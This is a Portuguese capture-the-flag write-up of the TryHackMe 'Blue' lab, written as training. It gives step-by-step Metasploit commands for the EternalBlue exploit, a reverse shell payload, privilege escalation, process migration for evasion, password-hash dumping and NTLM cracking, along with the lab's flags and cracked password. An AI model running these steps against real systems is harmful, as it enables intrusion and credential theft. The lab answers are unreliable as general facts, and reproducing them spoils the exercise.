# Write-up: TryHackMe - Blue (Exploração do Windows com MS17-010)

**Plataforma:** TryHackMe

**Sala:** Blue (da trilha Cybersecurity 101)

---

## 1. Introdução e Objetivos da Sala

A sala "Blue" do TryHackMe é um laboratório clássico e fundamental para iniciantes, projetado para ensinar a exploração de uma vulnerabilidade crítica do Windows, a MS17-010, popularmente conhecida como EternalBlue. O objetivo principal é guiar o usuário através do ciclo completo de um teste de intrusão: desde o reconhecimento inicial e identificação da vulnerabilidade até a exploração bem-sucedida usando o Metasploit Framework para obter acesso ao sistema e, subsequentemente, escalar privilégios.

Os principais objetivos abordados incluíram:
* Realizar varreduras de rede com Nmap para identificar portas abertas e serviços.
* Identificar sistemas Windows vulneráveis à falha MS17-010.
* Utilizar o Metasploit Framework para buscar, configurar e executar o exploit apropriado.
* Obter acesso shell ao sistema alvo.
* Aprender a converter uma shell simples para uma sessão Meterpreter.
* Escalar privilégios para NT AUTHORITY\SYSTEM.
* Realizar dump de hashes de senha e tentar quebrá-los.
* Localizar flags em locais chave do sistema.

---

## 2. Ferramentas Utilizadas

* **Nmap (Network Mapper):** Para reconhecimento de rede, varredura de portas e identificação de serviços e potenciais vulnerabilidades.
* **Metasploit Framework (`msfconsole`):** Para buscar, configurar, lançar o exploit e para pós-exploração (como `shell_to_meterpreter` e `hashdump`).
* **Terminal Linux (AttackBox do TryHackMe):** Para execução dos comandos Nmap e Metasploit.
* **[Opcional: Ferramenta de quebra de hash, como John the Ripper ou Hashcat, se usada offline]**

---

## 3. Visão Geral da Vulnerabilidade: MS17-010 (EternalBlue)

A MS17-010 é uma vulnerabilidade crítica no protocolo Server Message Block (SMB) v1 da Microsoft. Ela permite a execução remota de código (RCE) em sistemas Windows não corrigidos. A exploração mais conhecida desta falha é o "EternalBlue", que foi utilizado em ataques de ransomware em larga escala como o WannaCry. A vulnerabilidade reside na forma como o servidor SMBv1 lida com certas requisições, permitindo que um atacante envie pacotes especialmente criados para executar código arbitrário no sistema alvo com privilégios elevados (geralmente SYSTEM).

---

## 4. Metodologia e Resolução dos Desafios (Walkthrough)

Nesta seção, detalharei os passos que segui para comprometer a máquina "Blue", cujo IP era `[MACHINE_IP]`.

**Task 1: Recon (Reconhecimento)**

O primeiro passo foi identificar portas abertas e serviços rodando na máquina alvo, e verificar vulnerabilidades conhecidas. A sala informa que a máquina não responde a ping (ICMP), então o Nmap precisa ser instruído a não depender disso para considerar o host online.

1.  **Scan de Portas e Verificação de Vulnerabilidade MS17-010:**
    Utilizei o Nmap para escanear as portas e, simultaneamente, rodar o script NSE para a vulnerabilidade MS17-010. Como a máquina pode não responder a ping, usei a opção `-Pn`.
    ```bash
    nmap -Pn -sV --script smb-vuln-ms17-010 -p1-1000 [MACHINE_IP]
    ```
    Ou, para focar nas portas SMB mais comuns e depois escanear todas as portas abaixo de 1000:
    ```bash
    # Scan inicial focado em SMB
    nmap -Pn -p139,445 --script smb-vuln-ms17-010 [MACHINE_IP]
    # Scan para contar portas abaixo de 1000
    nmap -Pn -F [MACHINE_IP] 
    # (O -F escaneia as 100 portas mais comuns, se a pergunta for especificamente abaixo de 1000, -p1-999 seria mais preciso)
    # Para responder à pergunta de quantas portas abaixo de 1000 estão abertas, um scan como:
    # sudo nmap -Pn -sS -p1-999 [MACHINE_IP] seria mais apropriado.
    ```

    * **Resultado Observado:** [Descreva as portas abertas e o resultado do script `smb-vuln-ms17-010`. Ex: "O scan revelou X portas abertas abaixo de 1000, incluindo a porta 445/tcp (microsoft-ds). O script `smb-vuln-ms17-010` indicou que o host estava 'STATE: VULNERABLE' para MS17-010."]
    * **Pergunta:** How many ports are open with a port number under 1000?
        * **Resposta:** `3`
    * **Pergunta:** What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
        * **Resposta:** `ms17-010`

**Task 2: Gain Access (Obter Acesso)**

Com a vulnerabilidade confirmada, o próximo passo foi utilizar o Metasploit para explorá-la.

1.  **Iniciando o Metasploit:**
    ```bash
    msfconsole
    ```

2.  **Buscando e Selecionando o Exploit MS17-010:**
    ```bash
    msf6 > search ms17-010
    # Identificar o exploit eternalblue
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    ```
    * **Pergunta:** Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
        * **Resposta:** `exploit/windows/smb/ms17_010_eternalblue`

3.  **Configurando Opções do Exploit:**
    ```bash
    msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS [MACHINE_IP]
    ```
    * **Pergunta:** Show options and set the one required value. What is the name of this value? (All caps for submission)
        * **Resposta:** `RHOSTS`

4.  **Configurando o Payload (conforme instruído na sala):**
    ```bash
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
    ```
    *(Nota: É importante verificar se o alvo é x64. Se a sala não especificar, este é um payload comum. Também seria necessário configurar `LHOST` para o IP da AttackBox/sua máquina atacante).*

5.  **Executando o Exploit:**
    ```bash
    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
    ```
    * **Resultado da Exploração:** Após a execução, uma shell reversa foi obtida no sistema alvo. Foi necessário pressionar Enter para o prompt aparecer.

**Task 3: Escalate (Escalar Privilégios)**

O objetivo aqui era converter a shell simples para uma sessão Meterpreter e escalar privilégios.

1.  **Background da Shell Atual:**
    Com a shell ativa, pressionei `CTRL + Z` para colocá-la em background.
    ```
    Background session 1? [y/N]  y
    ```

2.  **Buscando e Usando o Módulo `shell_to_meterpreter`:**
    ```bash
    msf6 > search shell_to_meterpreter
    msf6 > use post/multi/manage/shell_to_meterpreter
    ```
    * **Pergunta:** Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
        * **Resposta:** `post/multi/manage/shell_to_meterpreter`

3.  **Configurando Opções do Módulo de Pós-Exploração:**
    ```bash
    msf6 post(multi/manage/shell_to_meterpreter) > show options
    # Identificar a sessão da shell em background (ex: sessions -l)
    msf6 post(multi/manage/shell_to_meterpreter) > set SESSION [ID_DA_SESSAO_SHELL] 
    ```
    * **Pergunta:** Select this (use MODULE_PATH). Show options, what option are we required to change?
        * **Resposta:** `SESSION`

4.  **Executando o Módulo de Conversão:**
    ```bash
    msf6 post(multi/manage/shell_to_meterpreter) > run
    ```
    * **Resultado:** Uma nova sessão Meterpreter foi criada.

5.  **Interagindo com a Sessão Meterpreter e Escalando Privilégios:**
    ```bash
    msf6 > sessions -i [ID_DA_NOVA_SESSAO_METERPRETER]
    meterpreter > getsystem
    ```
    O comando `getsystem` tenta várias técnicas para escalar para `NT AUTHORITY\SYSTEM`.
    Para confirmar:
    ```bash
    meterpreter > shell
    C:\Windows\system32> whoami
    nt authority\system
    C:\Windows\system32> exit 
    ```

6.  **Migrando o Processo (para estabilidade e evasão):**
    ```bash
    meterpreter > ps 
    # Identificar um processo estável rodando como NT AUTHORITY\SYSTEM (ex: spoolsv.exe, services.exe, ou outro PID específico da sua listagem)
    meterpreter > migrate [PID_DO_PROCESSO_ESCOLHIDO]
    ```
    * **Observação:** Esta etapa pode exigir algumas tentativas ou a escolha de diferentes processos.

**Task 4: Cracking (Quebrando Senhas)**

Com privilégios de SYSTEM, o próximo passo foi dumpar os hashes de senha.

1.  **Dump dos Hashes:**
    Dentro da sessão Meterpreter com privilégios de SYSTEM:
    ```bash
    meterpreter > hashdump
    ```
    * **Resultado Observado:** [Liste os hashes, incluindo o do usuário Jon. Ex: `Jon:500:aad3b435b51404eeaad3b435b51404ee:HASH_NTLM_DO_JON::: `]
    * **Pergunta:** Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
        * **Resposta:** `Jon`

2.  **Quebrando o Hash:**
    Copiei o hash NTLM do usuário Jon para um arquivo (ex: `hash_jon.txt`) na minha máquina atacante. Utilizei uma ferramenta como John the Ripper (ou Hashcat, ou um cracker online para NTLM) para quebrar o hash.
    *Exemplo com John:*
    ```bash
    john --format=NT hash_jon.txt 
    # (Pode ser necessário especificar uma wordlist com --wordlist=path/to/wordlist)
    john --show hash_jon.txt
    ```
    * **Pergunta:** Copy this password hash to a file and research how to crack it. What is the cracked password?
        * **Resposta:** `alqfna22`

**Flags Finais:**

Com acesso total ao sistema, as flags foram localizadas:

* **Pergunta:** Flag1? This flag can be found at the system root.
    * **Localização:** `C:\flag1.txt` (geralmente)
    * **Resposta:** `flag{access_the_machine}`
* **Pergunta:** Flag2? This flag can be found at the location where passwords are stored within Windows.
    * **Localização:** O arquivo SAM está em `C:\Windows\System32\config\SAM`. A flag pode estar em um arquivo de texto nesta pasta ou a pergunta pode se referir ao conceito.
    * **Resposta:** `flag{sam_database_elevated_access}`
* **Pergunta:** flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.
    * **Localização:** Provavelmente no Desktop ou Documentos do Administrador, ou do usuário Jon após obter acesso. Ex: `C:\Users\Administrator\Documents\flag3.txt` ou `C:\Users\Jon\Documents\flag3.txt`.
    * **Resposta:** `flag{admin_documents_can_be_valuable}`

---

## 5. Desafios Enfrentados

* A migração de processo (`migrate`) falhou algumas vezes, exigindo que eu tentasse diferentes PIDs de processos rodando como SYSTEM até encontrar um estável.
* A quebra do hash NTLM exigiu a seleção correta do formato no John the Ripper (`--format=NT`).

---

## 6. Lições Aprendidas e Conclusão

A sala "Blue" foi uma experiência prática crucial para entender o ciclo de vida de um ataque e a exploração de uma vulnerabilidade crítica do Windows. As principais lições foram:

* A eficácia do Nmap, especialmente com scripts NSE, para identificar vulnerabilidades conhecidas como a MS17-010.
* O fluxo de trabalho fundamental no Metasploit Framework: busca, seleção, configuração de `RHOSTS` e `PAYLOAD`, e execução de exploits.
* A importância da pós-exploração, incluindo a conversão de uma shell simples para uma sessão Meterpreter mais funcional e a escalação de privilégios com `getsystem`.
* A técnica de migração de processos para manter a persistência e, potencialmente, evadir detecções.
* Como os hashes de senha são armazenados no Windows e a possibilidade de dumpar e quebrá-los com ferramentas apropriadas após obter privilégios elevados.
* O impacto devastador de vulnerabilidades não corrigidas, como a MS17-010, que podem levar ao comprometimento total do sistema.

Esta sala reforça a importância da aplicação de patches de segurança e de uma boa higiene cibernética. Para um futuro Analista SOC, entender essas técnicas de ataque é vital para reconhecer os sinais de uma intrusão e para compreender os relatórios de times de pentest. Para quem almeja a área ofensiva, esta sala é um excelente ponto de partida prático.

---
